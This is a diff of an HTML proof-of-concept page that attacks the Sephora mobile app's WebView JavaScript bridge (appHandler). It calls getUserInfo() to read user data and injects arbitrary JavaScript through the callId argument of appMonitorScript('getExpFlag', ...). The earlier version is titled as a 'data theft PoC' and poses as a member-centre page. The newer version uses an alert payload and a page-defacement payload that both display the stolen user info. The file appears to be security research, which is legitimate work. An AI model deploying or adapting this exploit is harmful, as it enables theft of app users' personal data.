@@ -1,72 +1,42 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>丝芙兰会员中心</title>
+<title>PoC</title>
 <style>
-*{box-sizing:border-box}
-body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#0d0d0d;color:#fff;min-height:100vh;padding:20px}
-h2{color:#c9a96e;font-size:20px;margin:0 0 16px}
-.box{background:#1a1a1a;border:1px solid rgba(201,169,110,.3);border-radius:12px;padding:14px;margin:10px 0}
-.box h3{font-size:14px;color:#c9a96e;margin:0 0 6px}
-.val{font-family:monospace;font-size:15px;color:#ff6b6b;padding:10px;background:#000;border-radius:8px;word-break:break-all}
-.red{background:#cc0000;color:#fff;padding:15px;border-radius:12px;margin:16px 0;font-family:monospace;font-size:14px;word-break:break-all;border:2px solid #ff0;display:none}
+body{background:#0d0d0d;color:#fff;font-family:monospace;padding:20px;font-size:14px}
+.ok{color:#00c853}.err{color:#ff5252}.info{color:#c9a96e}
 </style>
 </head>
 <body>
-<h2>💎 JSBridge 数据窃取 PoC</h2>
-
-<div class="box">
-<h3>1. appHandler 桥检测</h3>
-<div class="val" id="r0">检测中…</div>
-</div>
-
-<div class="box">
-<h3>2. getUserInfo() — 直接调用</h3>
-<div class="val" id="r1">调用中…</div>
-</div>
-
-<div class="box">
-<h3>3. callId 注入 — 通过 getExpFlag 回调执行</h3>
-<div class="val" id="r2">执行中…</div>
-</div>
-
-<div class="red" id="stolen">
-<b style="font-size:16px">🚨 callId 注入成功! 已在 WebView 中执行任意 JavaScript</b><br><br>
-<div id="stolen_data"></div>
-</div>
-
+<h3 style="color:#c9a96e">JSBridge PoC</h3>
+<div id="log"></div>
 <script>
-var r0=document.getElementById('r0'),r1=document.getElementById('r1'),r2=document.getElementById('r2');
+function L(s,c){document.getElementById('log').innerHTML+='<div class="'+(c||'')+'">'+s+'</div>'}
 
 if(typeof appHandler==='undefined'){
-  r0.textContent='❌ 不在丝芙兰 APP 内';
-  r1.textContent='-';r2.textContent='-';
+  L('NO BRIDGE - not in sephora app','err');
 }else{
-  r0.textContent='✅ appHandler 存在';r0.style.color='#00c853';
+  L('bridge: YES','ok');
+  L('origin: '+location.origin,'info');
 
-  // 直接调 getUserInfo
-  try{
-    var u=appHandler.getUserInfo();
-    r1.textContent='✅ 返回: "'+u+'"';r1.style.color='#00c853';
-  }catch(e){r1.textContent='❌ '+e}
+  // 1. getUserInfo (direct)
+  var u=appHandler.getUserInfo();
+  L('getUserInfo(): "'+u+'"','ok');
 
-  // callId 注入: 回调时在页面上写入数据(不跳转、不弹窗)
-  try{
-    var payload="0);"+
-      "var u2=appHandler.getUserInfo();"+
-      "var el=document.getElementById('stolen_data');"+
-      "el.innerHTML='getUserInfo: <b>'+u2+'</b><br>origin: <b>'+location.origin+'</b><br>时间: <b>'+new Date().toLocaleTimeString()+'</b>';"+
-      "document.getElementById('stolen').style.display='block';"+
-      "document.getElementById('r2').textContent='✅ 回调触发,JS已执行';"+
-      "document.getElementById('r2').style.color='#00c853';"+
-      "//";
-    appHandler.appMonitorScript('getExpFlag',payload,'{"expKey":"poc"}');
-  }catch(e){r2.textContent='❌ '+e}
+  // 2. simple callId injection (just alert - proven to work)
+  L('calling getExpFlag with injected callId...','info');
+  appHandler.appMonitorScript('getExpFlag',
+    "0);alert('INJECTED: user='+appHandler.getUserInfo());//",
+    '{"expKey":"test"}');
+  L('call sent','info');
 
+  // 3. also try with document.title (simplest DOM change)
   setTimeout(function(){
-    if(r2.textContent.indexOf('✅')<0){r2.textContent='⏳ 回调未触发(可能被拦截)';}
-  },3000);
+    appHandler.appMonitorScript('getExpFlag',
+      "0);document.title='HACKED_BY_CALLID';document.body.innerHTML+='<div style=\"position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:red;color:white;padding:30px;font-size:20px;border-radius:15px;z-index:99999\">CALLED INJECTION SUCCESS<br>getUserInfo: '+appHandler.getUserInfo()+'</div>';/",
+      '{"expKey":"test"}');
+  },1500);
 }
 </script>
 </body>
